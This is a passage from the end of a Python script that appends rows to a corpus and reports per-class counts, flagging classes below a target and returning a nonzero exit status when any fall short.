    print(f"Appended {len(new_rows)} rows.  Corpus now has {len(combined)} rows.")
    print("Counts per class:")
    under = []
    for k, v in sorted(parents.items()):
        flag = "  <-- under target" if v < TARGET_PER_CLASS else ""
        if v < TARGET_PER_CLASS:
            under.append((k, v))
        print(f"  {k}: {v}{flag}")
    if under:
        print()
        print("Still under target:")
        for k, v in under:
            print(f"  {k}: {v} (need {TARGET_PER_CLASS - v} more)")
        return 1
    print()
    print("All classes at or above target count.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
